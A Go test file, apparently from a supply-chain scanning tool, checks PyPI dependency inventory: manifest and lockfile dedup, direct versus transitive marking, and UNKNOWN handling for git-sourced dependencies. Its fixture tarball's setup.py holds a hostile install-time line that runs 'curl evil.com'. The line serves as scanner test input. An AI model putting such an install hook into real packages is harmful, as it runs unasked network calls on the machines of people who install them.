package ci

import (
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"testing"

	rpypi "github.com/sairintechnologycom/pkgsafe/internal/registry/pypi"
)

// TestCI_RunScan_PyPIInventoryDepth exercises the multi-file Python
// inventory: manifest+lockfile dedup with direct/transitive marking, skipping
// the project's own uv.lock entry, and fail-closed UNKNOWN for direct URL
// dependencies.
func TestCI_RunScan_PyPIInventoryDepth(t *testing.T) {
	tmp := t.TempDir()
	t.Chdir(tmp)
	// Isolate the artifact/result caches: they key by filename under the
	// user's home, so parallel test packages downloading a same-named
	// fixture tarball would otherwise poison this test's hash verification.
	t.Setenv("HOME", tmp)

	if err := os.WriteFile(filepath.Join(tmp, "pyproject.toml"), []byte(`
[project]
name = "myapp"
dependencies = [
  "requests",
]
`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(tmp, "uv.lock"), []byte(`
version = 1

[[package]]
name = "myapp"
version = "0.1.0"
source = { virtual = "." }

[[package]]
name = "requests"
version = "2.31.0"
source = { registry = "https://pypi.org/simple" }
wheels = [
    { url = "https://files.pythonhosted.org/packages/requests-2.31.0-py3-none-any.whl", hash = "sha256:aaa", size = 1 },
]

[[package]]
name = "patched-lib"
version = "1.0.0"
source = { git = "https://github.com/example/patched-lib?rev=abc123" }
`), 0o644); err != nil {
		t.Fatal(err)
	}

	tarballContent := makeTarball(t, map[string]string{
		"setup.py": "import os; os.system('curl evil.com')",
	})
	hash := sha256.Sum256(tarballContent)
	hashHex := hex.EncodeToString(hash[:])

	mux := http.NewServeMux()
	var srv *httptest.Server
	requestsHits := 0
	mux.HandleFunc("/requests/json", func(w http.ResponseWriter, r *http.Request) {
		requestsHits++
		md := rpypi.Metadata{
			Info: rpypi.Info{Name: "requests", Version: "2.31.0"},
			Releases: map[string][]rpypi.File{
				"2.31.0": {
					{
						Filename:    "requests-2.31.0.tar.gz",
						PackageType: "sdist",
						URL:         srv.URL + "/tarballs/requests-2.31.0.tar.gz",
						Size:        int64(len(tarballContent)),
						Digests:     map[string]string{"sha256": hashHex},
					},
				},
			},
		}
		_ = json.NewEncoder(w).Encode(md)
	})
	mux.HandleFunc("/tarballs/", func(w http.ResponseWriter, r *http.Request) {
		_, _ = w.Write(tarballContent)
	})
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		t.Errorf("unexpected registry request: %s", r.URL.Path)
		http.NotFound(w, r)
	})
	srv = httptest.NewServer(mux)
	defer srv.Close()

	oldURL := rpypi.DefaultRegistryURL
	rpypi.DefaultRegistryURL = srv.URL
	defer func() { rpypi.DefaultRegistryURL = oldURL }()

	policyPath := filepath.Join(tmp, "policy.yaml")
	if err := os.WriteFile(policyPath, []byte(`
mode: block
thresholds:
  allow_max_score: 29
  warn_max_score: 69
  block_min_score: 70
`), 0o644); err != nil {
		t.Fatal(err)
	}

	res, err := RunScan(ScanOptions{
		Ecosystem:  "pypi",
		PolicyPath: policyPath,
		FailOn:     "block",
		JsonOutput: filepath.Join(tmp, "results.json"),
	})
	if err != nil {
		t.Fatal(err)
	}

	if res.Summary.PackagesScanned != 2 {
		t.Fatalf("expected 2 scan targets after dedup and local skip, got %d: %s", res.Summary.PackagesScanned, mustJSON(res.Findings))
	}
	if requestsHits != 1 {
		t.Fatalf("requests should be fetched exactly once after dedup, got %d hits", requestsHits)
	}
	if res.Summary.Unknown != 1 {
		t.Fatalf("direct URL dependency must surface as UNKNOWN: %+v", res.Summary)
	}

	byName := map[string]Finding{}
	for _, f := range res.Findings {
		byName[f.Package] = f
	}
	if _, present := byName["myapp"]; present {
		t.Fatalf("project's own uv.lock entry must not be scanned: %s", mustJSON(res.Findings))
	}
	req, ok := byName["requests"]
	if !ok || req.Version != "2.31.0" {
		t.Fatalf("expected requests@2.31.0 finding: %s", mustJSON(res.Findings))
	}
	if !req.Direct {
		t.Fatal("requests is listed in pyproject.toml and must stay marked direct")
	}
	patched := byName["patched-lib"]
	if patched.Decision != "unknown" {
		t.Fatalf("git-sourced dependency must be unknown, got %q", patched.Decision)
	}
	if patched.Direct {
		t.Fatal("lockfile-only dependency must not be marked direct")
	}
}

func mustJSON(v any) string {
	b, err := json.MarshalIndent(v, "", "  ")
	if err != nil {
		return fmt.Sprintf("%+v", v)
	}
	return string(b)
}
